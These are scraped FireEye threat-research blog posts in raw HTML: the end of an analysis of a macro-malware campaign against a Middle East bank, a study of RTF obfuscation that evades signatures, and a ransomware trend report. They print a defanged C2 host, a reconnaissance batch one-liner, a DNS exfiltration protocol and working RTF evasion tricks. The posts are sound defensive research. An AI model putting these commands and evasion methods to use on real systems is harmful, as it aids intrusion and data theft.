  <br />         <span class=""code"">Call ShowHideSheets</span>
  <br /> <span class=""code"">End Sub</span></p>
 <p>The code of subroutine <span class=""code"">ShowHideSheets()</span>,
  which unhides the content after completion of malicious activities, is
  shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure04-macro-used-to-unhide.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Macro used to unhide content at runtime</span></p>
 <h5>
  <b>First Stage Download</b></h5>
 <p>After the macro successfully creates the scheduled task, the dropped
  VBScript, <span class=""code"">update.vbs </span>(Figure 5), will be
  launched every three minutes. This VBScript performs the following operations:</p>
 <ol> <li>Leverages PowerShell to download content from the URI <span class=""code"">hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\dwn&amp;m=d
      and saves it in the directory %PUBLIC%\Libraries\dn.</span></li>
    <li>Uses PowerShell to download a BAT file from the URI <span class=""code"">hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\bat&amp;m=d
      and saves it in the directory %PUBLIC%\Libraries\dn.</span></li>
    <li>Executes the BAT file and stores the results in a file in the
    path <span class=""code"">%PUBLIC%\Libraries\up.</span></li>
    <li>Uploads this file to the server by sending an HTTP POST request
    to the URI <span class=""code"">hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\upl&amp;m=u.</span></li>
    <li>Finally, it executes the PowerShell script <span class=""code"">dns.ps1</span>, which is used for the purpose of data
    exfiltration using DNS.</li> </ol>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure05-content-of-update-vbs.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Content of update.vbs</span></p>
 <p>During our analysis, the VBScript downloaded a customized version of
  Mimikatz in the previously mentioned step one. The customized version
  uses its own default prompt string as well as its own console title,
  as shown in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure06-mimikatz.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Custom version of Mimikatz used to
    extract user password hashes</span></p>
 <p>Similarly, the contents of the BAT file downloaded in step two are
  shown in Figure 7:</p>
 <p>
  <span class=""code"">whoami &amp; hostname &amp; ipconfig /all &amp; net
    user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp;
    net group &quot;domain admins&quot; /domain 2&gt;&amp;1 &amp; net
    group &quot;Exchange Trusted Subsystem&quot; /domain 2&gt;&amp;1
    &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1
    &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an
    2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1
    &amp; systeminfo 2&gt;&amp;1 &amp; reg query
    &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server
    Client\Default&quot; 2&gt;&amp;1</span></p>
 <p>
  <span class=""type-XS"">Figure 7: Content of downloaded BAT script</span></p>
 <p>This BAT file is used to collect important information from the
  system, including the currently logged on user, the hostname, network
  configuration data, user and group accounts, local and domain
  administrator accounts, running processes, and other data.</p>
 <h5>
  <b>Data Exfiltration over DNS</b></h5>
 <p>Another interesting technique leveraged by this malware was the use
  of DNS queries as a data exfiltration channel. This was likely done
  because DNS is required for normal network operations. The DNS
  protocol is unlikely to be blocked (allowing free communications out
  of the network) and its use is unlikely to raise suspicion among
  network defenders.</p>
 <p>The script <span class=""code"">dns.ps1</span>, dropped by the macro,
  is used for this purpose. In the following section, we describe its
  functionality in detail.</p>
 <ol> <li>The script requests an ID (through the DNS protocol) from
      <span class=""code"">go0gIe[.]com</span>. This ID will then be saved
    into the PowerShell script.</li> <li>Next, the script queries the C2
    server for additional instructions. If no further actions are
    requested, the script exits and will be activated again the next
    time <span class=""code"">update.vbs</span> is called.</li> <li>If an
    action is required, the DNS server replies with an IP with the
    pattern <span class=""code"">33.33.xx.yy</span>. The script then
    proceeds to create a file at <span class=""code"">%PUBLIC%\Libraries\tp\chr(xx)chr(yy).bat</span>. The
    script then proceeds to make DNS requests to fetch more data. Each
    DNS request results in the C2 server returning an IP address. Each
    octet of the IP address is interpreted as the decimal representation
    of an ASCII character; for example, the decimal number 99 is
    equivalent to the ASCII character ‘c’. The characters represented by
    the octets of the IP address are appended to the batch file to
    construct a script. The C2 server signals the end of the data stream
    by replying to a DNS query with the IP address 35.35.35.35.</li>
    <li>Once the file has been successfully transferred, the BAT file
    will be run and its output saved as <span class=""code"">%PUBLIC%\Libraries\tp\chr(xx)chr(yy).txt</span>.</li>
    <li>The text file containing the results of the BAT script will then
    be uploaded to the DNS server by embedding file data into part of
    the subdomain. The format of the DNS query used is shown in Table
  1.</li> <li>The BAT file and the text file will then be deleted. The
    script then quits, to be invoked again upon running the next
    scheduled task.</li> </ol>
 <p>The DNS communication portion of the script is shown in Figure 8,
  along with a table showing the various subdomain formats being
  generated by the script.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Middle%20East%20Bank%20Sudeep/figure08-code-snippet-dns.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Code Snippet of dns.ps1</span></p>
 <p>Format of subdomains used in DNS C2 protocol:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""127""><p>Subdomain used to request for
          BotID, used in step 2 above</p> </td> <td valign=""top"" width=""299""><p>[00][botid]00000[base36 random number]30</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""127""><p>Subdomain used while performing
          file transfers used in step 3 above</p> </td> <td valign=""top"" width=""299""><p>[00][botid]00000[base36 random number]232A[hex_filename][i-counter]</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""127""><p>Subdomain used while performing
          file upload, used in step 5 above</p> </td> <td valign=""top"" width=""299""><p>[00][botid][cmdid][partid][base36 random number][48-hex-char-of-file-content]</p>
      </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 1: C2 Protocol Format</span></p>
 <h5>Conclusion</h5>
 <p>Although this attack did not leverage any zero-days or other
  advanced techniques, it was interesting to see how attackers used
  different components to perform reconnaissance activities on a
  specific target.</p>
 <p>This attack also demonstrates that macro malware is effective even
  today. Users can protect themselves from such attacks by disabling
  Office macros in their settings and also by being more vigilant when
  enabling macros (especially when prompted) in documents, even if such
  documents are from seemingly trusted sources.</p>",http://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html
How RTF malware evades static signature-based detection,"<h4>
  <b>History</b></h4>
 <p>Rich Text Format (RTF) is a document format developed by Microsoft
  that has been widely used on various platforms for more than 29 years.
  The RTF format is very flexible and therefore complicated. This makes
  the development of a safe RTF parsers challenging. Some notorious
  vulnerabilities such as <a href=""http://www.microsoft.com/technet/security/Bulletin/MS10-087.mspx"">CVE-2010-3333</a>
  and <a href=""https://blogs.mcafee.com/mcafee-labs/close-look-rtf-zero-day-attack-cve-2014-1761-shows-sophistication-attackers/"">CVE-2014-1761</a>
  were caused by errors in implementing RTF parsing logic.</p>
 <p>In fact, RTF malware is not limited to exploiting RTF parsing
  vulnerabilities. Malicious RTF files can include other vulnerabilities
  unrelated to the RTF parser because RTF supports the embedding of
  objects, such as OLE objects and images. <a href=""https://technet.microsoft.com/en-us/library/security/ms12-027.aspx"">CVE-2012-0158</a>
  and <a href=""https://blog.fortinet.com/post/the-curious-case-of-the-document-exploiting-an-unknown-vulnerability-part-1"">CVE-2015-1641</a>
  are two typical examples of such vulnerabilities – their root cause
  does not reside in the RTF parser and attackers can exploit these
  vulnerabilities through other file formats such as DOC and DOCX.</p>
 <p>Another type of RTF malware does not use any vulnerabilities. It
  simply contains embedded malicious executable files and tricks the
  user into launching those malicious files. This allows attackers to
  distribute malware via email, which is generally not a vector for
  sending executable files directly.</p>
 <p>Plenty of malware authors prefer to use RTF as an attack vector
  because RTF is an obfuscation-friendly format. As such, their malware
  can easily evade static signature based detection such as YARA or
  Snort. This is a big reason why, in this scriptable exploit era, we
  still see such large volumes of RTF-based attacks.</p>
 <p>In this blog, we present some common evasive tricks used by
  malicious RTFs. </p>
 <h4>
  <b>Common obfuscations</b></h4>
 <p>Let’s discuss a couple different RTF obfuscation strategies.</p>
 <p>
  <b>1.     CVE-2010-3333</b></p>
 <p>This vulnerability, reported by Team509 in 2009, is a typical stack
  overflow bug. Exploitation of this vulnerability is so easy and
  reliable that it is still used in the wild, seven years after its
  discovery! Recently, attackers exploiting this vulnerability <a href=""http://researchcenter.paloaltonetworks.com/2016/02/new-malware-rover-targets-indian-ambassador-to-afghanistan/"">targeted
    an Ambassador of India</a>.</p>
 <p>The root cause of this vulnerability was that the Microsoft RTF
  parser has a stack-based buffer overflow in the procedure parsing the
  pFragments shape property. Crafting a malicious RTF to exploit this
  vulnerability allows attackers to execute arbitrary code. Microsoft
  has since addressed the vulnerability, but many old versions of
  Microsoft Office were affected, so its threat rate was very high.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab1.png"" /></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab2.png"" /></p>
 <p>The Microsoft Office RTF parser lacks proper bounds checking when
  copying source data to a limited stack-based buffer. The pattern of
  this exploit can be simplified as follows:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""415""><p>{\rtf1{\shp{\sp{\sn
          pFragments}{\sv A;B;[word1][word2][word3][hex value
        array]}}}}</p> </td> </tr></tbody></table>
 <p>Because pFragments is rarely seen in normal RTF files, many firms
  would simply detect this keyword and the oversized number right after
  \sv in order to catch the exploit using YARA or Snort rules. This
  method works for samples that are not obfuscated, including samples
  generated by Metasploit. However, against in-the-wild samples, such
  signature-based detection is insufficient. For instance, <a href=""http://researchcenter.paloaltonetworks.com/2016/02/new-malware-rover-targets-indian-ambassador-to-afghanistan/"">the
    malicious RTF targeting the Ambassador of India</a> is a good sample
  to illustrate the downside of the signature based detection. Figure 1
  shows this RTF document in a hex editor. We simplified Figure 1
  because of the space limitations – there were plenty of dummy symbols
  such as { } in the initial sample.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Obfuscated sample of CVE-2010-3333</span></p>
 <p>As we can see, the pFragments keyword has been split into many
  pieces that would bypass most signature based detection. For instance,
  most anti-virus products failed to detect this sample on first
  submission to VirusTotal. In fact, not only will the split pieces of
  \sn be combined together, pieces of \sv will be combined as well. The
  following example demonstrates this obfuscation:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""78""><p>Obfuscated</p> </td> <td valign=""top"" width=""337""><p>{\rtf1{\shp{\sp{\sn2 pF}{\sn44
          ragments}{\sv 1;28}{\sv ;fffffffffffff….}}}}</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""78""><p>Clear</p> </td> <td valign=""top"" width=""337""><p>{\rtf1{\shp{\sp{\sn pFragments}{\sv 1;28
        ;fffffffffffff….}}}}</p> </td> </tr></tbody></table>
 <p>We can come up with a variety of ideas different from the
  aforementioned sample to defeat static signature based detection.</p>
 <p>Notice the mixed ‘\x0D’ and ‘\x0A’ – they are ‘\r’ and ‘\n’ and the
  RTF parser would simply ignore them.</p>
 <p>
  <b>2.     Embedded objects</b></p>
 <p>Users can embed variety of objects into RTF, such as OLE (Object
  Linking and Embedding) control objects. This makes it possible for OLE
  related vulnerabilities such as CVE-2012-0158 and CVE-2015-1641 to be
  accommodated in RTF files. In addition to exploits, it is not uncommon
  to see executable files such as PE, CPL, VBS and JS embedded in RTF
  files. These files require some form of social engineering to trick
  users into launching the embedded objects. We have even seen some Data
  Loss Prevention (DLP) solutions embedding PE files inside RTF
  documents. It’s a bad practice because it cultivates poor habits in users.</p>
 <p>Let’s take a glance at <a href=""https://www.microsoft.com/en-sg/download/details.aspx?id=10725"">the
    embedded object syntax first</a>:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab3.png"" /></p>
 <p>&lt;objtype&gt; specifies the type of object. \objocx is the most
  common type used in malicious RTFs for embedding OLE control objects;
  as such, let’s take it as an example. The data right after \objdata is
  OLE1 native data, <a href=""https://www.microsoft.com/en-sg/download/details.aspx?id=10725"">defined as</a>:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""64""><p>&lt;data&gt;</p> </td> <td valign=""top"" width=""351""><p>(\binN #BDATA) | #SDATA</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""64""><p>#BDATA</p> </td> <td valign=""top"" width=""351""><p>Binary data</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""64""><p>#SDATA</p> </td> <td valign=""top"" width=""351""><p>Hexadecimal data</p> </td> </tr></tbody></table>
 <p>Attackers would try to insert various elements into the &lt;data&gt;
  to evade static signature detection. Let’s take a look at some
  examples to understand these tricks:</p>
 <p>a.     For example, \binN can be swapped with #SDATA. The data right
  after \binN is raw binary data. In the following example, the numbers
  123 will be treated as binary data and hence translated into hex
  values 313233 in memory.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""42""><p>Obfuscated</p> </td> <td valign=""top"" width=""337""><p>｛\object\objocx\objdata \bin3
        123｝</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""42""><p>Clear</p> </td> <td valign=""top"" width=""337""><p>｛\object\objocx\objdata 313233｝</p> </td> </tr></tbody></table>
 <p>Let’s look at another example:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""63""><p>Obfuscated</p> </td> <td valign=""top"" width=""316""><p>｛\object\objocx\objdata
          \bin41541544011100001100000000000000000000000000000000000000000003
        123｝</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""63""><p>Clear</p> </td> <td valign=""top"" width=""316""><p>｛\object\objocx\objdata 313233｝</p> </td> </tr></tbody></table>
 <p>If we try to call atoi or atol with the numeric parameter string
  marked in red in the table above, we will get 0x7fffffff while its
  true value should be 3.</p>
 <p>This happens because <a href=""https://www.microsoft.com/en-sg/download/details.aspx?id=10725"">\bin
    takes a 32-bit signed integer numeric parameter</a>. You would think
  that the RTF parser calls atoi or atol to convert the numeric string
  to an integer; however, that’s is not the case. Microsoft Word’s RTF
  parser does not use these standard C runtime functions. Instead, the
  atoi function in Microsoft Word’s RTF parser is implemented as follows:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab4.png"" /></p>
 <p>b.     \ucN and \uN<br /> Both of them are ignored, and the
  characters right after \uN would not be skipped.</p>
 <p>c.     The space characters: 0x0D (\n), 0x0A (\r), 0x09 (\t) are ignored.</p>
 <p>d.     Escaped characters<br /> RTF has some special symbols that
  are reserved. For normal use, users will need to escape these symbols.
  Here's an incomplete list:</p>
 <p>\}  <br /> \{<br /> \%<br /> \+<br /> \-<br /> \\<br /> \'hh</p>
 <p>All of those escaped characters are ignored, but there’s an
  interesting situation with \’hh. Let’s look into an example first:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""70""><p>Obfuscated</p> </td> <td valign=""top"" width=""309""><p>{\object\objocx\objdata 341\’112345
        }</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""70""><p>Clear</p> </td> <td valign=""top"" width=""309""><p>{\object\objocx\objdata 342345}</p> </td> </tr></tbody></table>
 <p>When parsing \’11, the parser will treat the 11 as an encoded hex
  byte. This hex byte is then discarded before it continues parsing the
  rest of objdata. The 1 preceding \’11 has also been discarded. Once
  the RTF parser parses the 1 right before \’11, which is the higher
  4-bit of an octet, and then immediately encounters \’11, the higher
  4-bit would be discarded. That’s because the internal state for
  decoding the hex string to binary bytes has been reset.</p>
 <p>The table below shows the processing procedure, the two 1s in the
  yellow rows are from \’11. It’s clear that the mixed \’11 disorders
  the state variable, which causes the higher 4-bit of the second byte
  to be discarded:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab5.png"" /></p>
 <p>e.     Oversized control word and numeric parameter<br /> The <a href=""https://www.microsoft.com/en-sg/download/details.aspx?id=10725"">RTF
  specification</a> says that a control word’s name cannot be longer
  than 32 letters and the numeric parameter associated with the control
  word must be a signed 16-bit integer or signed 32-bit integer, but the
  RTF parser of Microsoft Office doesn’t strictly obey the
  specification. Its implementation only reserves a buffer of size 0xFF
  for storing the control word string and the numeric parameter string,
  both of which are null-terminated. All characters after the maximum
  buffer length (0xFF) will not remain as part of the control word or
  parameter string. Instead, the control word or parameter will be terminated.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab6.png"" /></p>
 <p>In the first obfuscated example, the length of the over-sized
  control word is 0xFE. By adding a null-terminator, the control word
  string will reach the maximum length of 0xFF, then the remaining data
  belongs to objdata.</p>
 <p>For the second obfuscated example, the total length of the “bin”
  control word and its parameter is 0xFD. By adding their
  null-terminator, the length equals 0xFF.</p>
 <p>f.     Additional techniques</p>
 <p>The program uses the last \objdata control word in a list, as shown here:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""63""><p>Obfuscated</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata
          554564{\*\objdata 4444}54545} OR</p>
          <p>{\object\objocx\objdata 554445\objdata 444454545}</p>
          <p>{\object\objocx{{\objdata 554445}{\objdata 444454545}}}</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""63""><p>Clear</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata 444454545}</p> </td> </tr></tbody></table>
 <p>As we can see here, except for \binN, other control words are ignored:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""63""><p>Obfuscated</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata
          44444444{\par2211 5555}6666}       OR</p>
          <p>{\object\objocx\objdata 44444444{\datastore2211 5555}6666}
        OR</p> <p>{\object\objocx\objdata 44444444\datastore2211
          55556666}   OR</p> <p>{\object\objocx\objdata
          44444444{\unknown2211 5555}6666}   OR</p>
          <p>{\object\objocx\objdata 44444444\unknown2211 55556666}</p>
        <p> </p> </td> </tr>
    <tr>
      <td valign=""top"" width=""63""><p>Clear</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata 4444444455556666}</p>
      </td> </tr></tbody></table>
 <p>There is another special case that makes the situation a bit more
  complicated. That is control symbol \*. From RTF specification, we can
  get the description for <a href=""https://www.microsoft.com/en-sg/download/details.aspx?id=10725"" target=""_blank"">this control symbol:</a></p>
 <p>    <i>Destinations added after the <a href=""https://www.fireeye.com/blog/threat-research/_jcr_content.feed#RTF_Spec_1987"">1987
      RTF Specification</a> may be preceded by the control symbol
    <b>\*</b> (backslash asterisk). This control symbol identifies
    destinations whose related text should be ignored if the RTF reader
    does not recognize the destination control word.</i></p>
 <p>Let’s take a look at how it can be used in obfuscations:</p>
 <p>1.      </p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""63""><p>Obfuscated</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata
          44444444{\*\par314 5555}6666}</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""63""><p>Clear</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata 4444444455556666}</p>
      </td> </tr></tbody></table>
 <p>\par is a known control word that does not accept any data. RTF
  parser will skip the control word and only the data that follows remains.</p>
 <p>2.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""63""><p>Obfuscated</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata
          44444444{\*\datastore314 5555}6666}</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""63""><p>Clear</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata 444444446666}</p>
      </td> </tr></tbody></table>
 <p>RTF parser can also recognize \datastore and understand that it can
  accept data, therefore the following data will be consumed by \datastore.</p>
 <p>3.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""63""><p>Obfuscated</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata
          44444444{\*\unknown314 5555}6666}</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""63""><p>Clear</p> </td> <td valign=""top"" width=""316""><p>{\object\objocx\objdata 444444446666}</p>
      </td> </tr></tbody></table>
 <p>For an analyst, it’s difficult to manually extract embedded objects
  from an obfuscated RTF, and no public tool can handle obfuscated RTF.
  However, winword.exe uses the OleConvertOLESTREAMToIStorage function
  to convert OLE1 native data to OLE2 structured storage object. Here’s
  the prototype of OleConvertOLESTREAMToIStorage:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab9.png"" /></p>
 <p>The object pointed by lpolestream contains a pointer to OLE1 native
  binary data. We can set a breakpoint at OleConvertOLESTREAMToIStorage
  and dump out the object data which has been de-obfuscated by the RTF Parser:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/RFT%20malware%20Yang/Tab10.png"" /></p>
 <p>The last command .writemem writes a section of memory to
  d:\evil_objdata.bin. You can specify other paths as you want; 0e170020
  is the start address of the memory range, and 831b6 is the size.</p>
 <p>Most of the obfuscation techniques of \objdata can also apply to
  embedded images, but for images, it seems there is no obvious
  technique as OleConvertOLESTREAMToIStorage. To extract an obfuscated
  picture, locate the RTF parsing code quickly using data breakpoint and
  that will reveal the best point to dump the whole data.</p>
 <h4>
  <b>Conclusion</b></h4>
 <p>Our adversaries are sophisticated and familiar with the RTF format
  and the inner workings of Microsoft Word.  They have managed to devise
  these obfuscation tricks to evade traditional signature-based
  detection. Understanding how our adversary is performing obfuscation
  can in turn help us improve our detection of such malware.</p>
 <h4>
  <b>Acknowledgements</b></h4>
 <p>Thanks to Yinhong Chang, Jonell Baltazar and Daniel Regalado for
  their contributions to this blog.</p>",http://www.fireeye.com/blog/threat-research/2016/05/how_rtf_malware_evad.html
"Ransomware Activity Spikes in March, Steadily increasing throughout 2016","<p>
  <i>UPDATE (June 15, 2016): This post has been updated to include new
    data on ransomware activity, which is also now broken down by region.</i></p>
 <p>Cyber extortion for financial gain is typically carried out in one
  of two ways. The first method is a business disruption attack – a
  category we discussed at length in <a href=""https://www2.fireeye.com/M-Trends-2016.html"">M-Trends
  2016</a>. In this type of attack, threat actors target an
  organization’s critical business systems, capture confidential data
  and threaten to do something malicious with that data (such as expose,
  delete, or encrypt it) unless a ransom is paid. This method is
  generally more targeted, requires a greater deal of finesse on the
  part of the threat actors, and often has a greater potential payout.</p>
 <p>Ransomware is the other common method of cyber extortion for
  financial gain. <a href=""https://www.fireeye.com/current-threats/what-is-cyber-security/ransomware.html"">Ransomware</a>
  is a type of malware that prevents users from interacting with their
  files, applications or systems until a ransom is paid, typically in
  the form of an anonymous currency such as Bitcoin. While individual
  computer and mobile device users have long been targets of ransomware,
  the threat has expanded. Ransomware has gained publicity in recent
  months through mainstream media coverage of ransomware attacks against
  organizations, namely hospitals.</p>
 <p>While the end goal is the same – some type of financial payout to
  the attacker – not all ransomware operates the same way. The
  file-encrypting variety is perhaps the most dangerous. This is because
  the targeted files, which often contain users’ or organizations’ most
  valuable data, become useless without the decryption key. The issue is
  compounded because paying the ransom offers no guarantee that the
  files will be unlocked, thus making frequent backups the best defense
  against ransomware.</p>
 <p>Since the average ransom demanded from an individual user is
  relatively low (typically a few hundred dollars, if that), threat
  actors distributing ransomware typically follow the “spray and pray”
  tactic of sending out as many lures as possible – emails with
  malicious attachments or links to malicious websites, for example – to
  maximize their potential gains.</p>
 <h5>Ransomware Spike in March</h5>
 <p>Based on data from FireEye Dynamic Threat Intelligence, ransomware
  activity has been rising fairly steadily since mid-2015. We observed a
  noticeable spike in March 2016. Figure 1 depicts the percentage of
  ransomware compared to all malware detected on FireEye products from
  October 2015 to May 2016.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20update/Fig1.jpeg"" /></p>
 <p>Figure 1: Ransomware detections from August 2015 to May 2016</p>
 <p>The spike is noteworthy, and consistent with other observations. In
  March 2016, FireEye Labs detected a significant <a href=""https://www.fireeye.com/blog/threat-research/2016/03/surge_in_spam_campai.html"">rise
    in Locky ransomware</a> downloaders due to an email spam campaign
  targeting users in more than 50 countries. The malicious email
  attachments pretended to contain an invoice or a picture, but opening
  the attachment led to an infection instead.</p>
 <h5>Ransomware in the Media</h5>
 <p>There is no denying the satisfaction an attacker feels when their
  exploits make the news. For threat actors distributing ransomware, the
  satisfaction is even greater when the headlines report that the victim
  paid the ransom. A recent blitz of ransomware reports in the media –
  as well as the follow-up success stories – may have spurred other
  attackers to get in on the action, possibly resulting in the March
  ransomware activity spike. The Petya ransomware, for instance,
  includes links to recent media articles on its ransom payment page, as
  shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20fireeye%20threat%20intel/fig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: FireEye Threat Intelligence in 2016
    uncovered Petya ransomware advertising links to recent media
    articles on their ransomware payment page</span></p>
 <p>
  <i>Hollywood Presbyterian Medical Center incident</i></p>
 <p>In early February, Hollywood Presbyterian Medical Center (HPMC) was
  in the media spotlight after their systems <a href=""http://www.latimes.com/business/technology/la-me-ln-hollywood-hospital-bitcoin-20160217-story.html"">became
    infected with file-encrypting ransomware</a>. Midway through the
  month, Allen Stefanek, president and CEO, <a href=""http://hollywoodpresbyterian.com/default/assets/File/20160217%20Memo%20from%20the%20CEO%20v2.pdf"">wrote</a>
  that staff had trouble accessing the network beginning Feb. 5. He
  explained that malware locked access to certain computer systems and
  prevented the sharing of communications electronically, and indicated
  that a ransom of 40 Bitcoins had been requested (approximately $17,000
  at the time).</p>
 <p>“The quickest and most efficient way to restore our systems and
  administrative functions was to pay the ransom and obtain the
  decryption key,” Stefanek wrote. “In the best interest of restoring
  normal operations, we did this.” HPMC restored its electronic medical
  record system and cleared all systems of the malware by Feb. 15.</p>
 <p>
  <i>Continued targeting of hospitals</i></p>
 <p>Attackers may have taken a hint that hospitals are a lucrative
  target. Later in February, <a href=""http://www.theregister.co.uk/2016/02/26/german_hospitals_ransomware/"">The
    Register reported</a> that file-encrypting ransomware infected the
  systems of Lukas Hospital and Klinikum Arnsberg hospital – both in
  Germany. Then in March, <a href=""http://arstechnica.com/security/2016/03/maryland-hospital-group-hit-by-ransomware/"">Ars
    Technica reported</a> that data at Union Memorial Hospital in
  Maryland – as well as other MedStar hospitals in the Washington, DC
  area – were encrypted by ransomware, and that the requested ransom was
  45 Bitcoins, or about $18,500 at the time.</p>
 <p>The targeting of hospitals is no surprise. Cyber criminals have been
  increasingly turning to industries such as healthcare that possess
  critical data but may have limited investment in security across their
  enterprise. With hospitals, budget dollars often go towards surgery
  wards, emergency care centers and supplies for a large number of
  patients – not security. This makes for a tricky issue, since
  hospitals cannot operate without the necessary patient data stored in
  their systems.</p>
 <h5>Other Factors Influencing Uptick in Ransomware Activity</h5>
 <p>High-profile media coverage of ransomware is certainly attracting
  attackers, but that is not the only factor driving the uptick in
  activity. The following are some additional factors contributing to
  the increase:</p>
 <ul> <li>Relatively high profit margins coupled with the relatively low
    overhead required to operate a ransomware campaign have bolstered
    the appeal of this particular attack type, fueling market demand for
    tools and services corresponding to its propagation. For example,<a href=""https://www.fireeye.com/blog/threat-research/2015/05/teslacrypt_followin.html"">
      in 2015</a> we observed a small-scale ransomware operation that
    nevertheless likely netted the perpetrators about $75,000.</li>
    <li>The success of prolific ransomware families such as CryptoWall
    has provided a blueprint for aspiring ransomware developers,
    showcasing increasing profit margins and campaign sustainability.
    According to the <a href=""https://www.ic3.gov/media/2015/150623.aspx"">FBI's Internet
      Crime Complaint Center</a> (IC3), CryptoWall generated identified
    victim losses totaling more than $18 million between April 2014 and
    June 2015.</li> <li>The emergence of several new ransomware variants
    adopting a ransomware as a Service (RaaS) framework since mid-2015,
    a phenomenon likely driven by the competitive development of quality
    goods and services within the cyber crime ecosystem. Based on
    multiple factors, RaaS offerings – which are uniquely poised to
    capitalize on current underground marketplace demand for ransomware
    – are highly likely to fuel an increasing number of ransomware
  infections.</li> </ul>
 <h5>Ransomware Variants</h5>
 <p>Through this discernible uptick in ransomware activity from mid-2015
  to early 2016, FireEye has observed significant growth and maturation
  of the ransomware threat landscape – predominately involving the
  proliferation of myriad new variants.</p>
 <p>
  <i>Prolific Ransomware Families</i></p>
 <p>We continue to observe the sustained distribution of multiple,
  well-established ransomware families used in both geographically
  targeted and mass infection campaigns. In multiple cases these
  renowned variants, such as CryptoWall and TorrentLocker, spawned
  updated variants with improvements in either encryption capabilities
  or obfuscation techniques. These established ransomware brands will
  continue to pose a significant threat to global enterprises, as
  malware functionality, encryption techniques and counter-mitigation
  measures are adapted and successfully introduced into updated
  variants. Examples include:</p>
 <ul> <li>
    <b>TorrentLocker:</b> Throughout 2015, FireEye observed continued
    distribution of TorrentLocker, a ransomware family based on both
    CryptoLocker and CryptoWall. According to multiple open-source
    reports, TorrentLocker has been active since at least early 2014 and
